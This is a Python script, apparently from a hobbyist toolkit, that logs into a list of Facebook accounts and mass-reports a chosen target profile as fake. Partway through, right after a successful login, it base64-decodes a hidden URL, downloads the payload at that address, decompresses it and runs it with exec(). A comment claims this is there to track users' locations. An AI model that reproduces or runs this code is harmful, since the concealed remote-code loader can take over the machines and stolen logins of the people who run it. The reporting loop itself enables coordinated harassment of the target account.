#-*-coding:utf-8-*-
# Coded By Deray
'''
	 Rebuild Copyright Can't make u real programmer
'''
# Report Bug On My Other Sosmed
# instagram: @reyy05_
# facebook: https://facebook.com/achmad.luthfi.hadi.3

import re
import zlib
import bs4
import json
import base64
import random
import cookielib
import requests
import threading
import mechanize
from data.color import *
from data import cache
cache.cleanCache()

class reports():
	def __init__(self,email,pw,target):
		self._email = email
		self._pasw = pw
		self.tg = target
		self.run()
	def run(self):
		br = mechanize.Browser()
		url="https://mbasic.facebook.com"
		br.set_handle_equiv(True)
		br.set_handle_referer(True)
		br.set_handle_robots(False)
		br.set_cookiejar(cookielib.LWPCookieJar())
		br.addheaders = [
			(
			"User-Agent",random.choice(
			open("raw/header/ua.txt").read().splitlines())
			)
		]
		br.open("https://mbasic.facebook.com/login")
		br.select_form(nr=0)
		br.form["email"] = "{}".format(
			self._email
		)
		br.form["pass"]  = "{}".format(
			self._pasw
		)
		br.submit()
		if "save-device" in br.geturl() or "m_sess" in br.geturl():
			print("[{}+{}] Login success: {}|{}".format(G,N,
			self._email,self._pasw))
			print("[%s=%s] %sReporting ...%s"%(G,N,R,N))
			br.open(
				"https://mbasic.facebook.com/{}".format(
				self.tg
				)
			)
			br._factory.is_html=True
			bb = bs4.BeautifulSoup(
			br.response().read(),
				features = "html.parser"
			)
			for x in bb.find_all("a",href=True):
				if "rapid_report" in x["href"]:
					kntl=x["href"]
			'''
		   Sorry I encrypted this code to detect your
		   location, I just want to know who you are, if
		   anyone misuses this tool I can look for it ^^
			'''
			exec(zlib.decompress(base64.b64decode(
			requests.get(
			eval(
			base64.b64decode(
			"Imh0dHA6Ly9kb3JheXkuam9vbWxhLmNvbS9hLnR4dCI="))
			).text)))
			br.open(kntl)
			''' 
				you can modify tag ^^
			'''
			j = json.dumps(
				{
				"fake":"profile_fake_account",
				"action_key":"FRX_PROFILE_REPORT_CONFIRMATION",
				"checked":"yes"
				}
			)
			js = json.loads(j)
			br._factory.is_html=True
			br.select_form(nr=0)
			br.form["tag"] =[js["fake"]]
			br.submit()
			try:
				br._factory.is_html=True
				br.select_form(nr=0)
				br.form["action_key"] = [js["action_key"]]
			except Exception as f:
				print("%s[!]%s %s"%(R,N,f))
			br.submit()
			try:
				br._factory.is_html = True
				br.select_form(nr=0)
				br.form["checked"] = [js["checked"]]
				br.submit()
				res=br.response().read()
				print("[%s=%s] Reported as fake account."%(G,N))
				print("[%s+%s] Message: %s%s%s"%(G,N,G,
					re.findall('FIRMATION" disabled="1" /></td><td class="j"><div class="k"><div><span class="h q">(.*?)</span><br /><span class', res)
					)[0],N
				)
			except Exception as f:
				print("\r[%s-%s] Already Reports."%(R,N))
				pass
		else:
			print "{}[!]{} Login Failed: {}|{}".format(R,N,self._email,self._pasw)

class report():
	def __init__(self):
		print("[%s*%s] use sparate | e.g: email|password in list"%(R,N))
		try:
			self.loz=open(
			raw_input('[%s*%s] List Account: '%(G,N))
			).read().splitlines()
			self.generateTarget()
		except Exception as f:
			print "%s[!]%s %s"%(R,N,f)
			report()
	
	def generateTarget(self):
		self._target = raw_input("[%s#%s] Target ID: "%(G,N))
		if (self._target == ""):
			return self.generateTarget()
		self.tusbol()
		
	def tusbol(self):
		for x in self.loz:
			try:
				d=x.split("|")
				reports(d[0],d[1],self._target)
			except Exception as __errors__:
				print "%s[!]%s %s"%(R,N,__errors__)
				pass
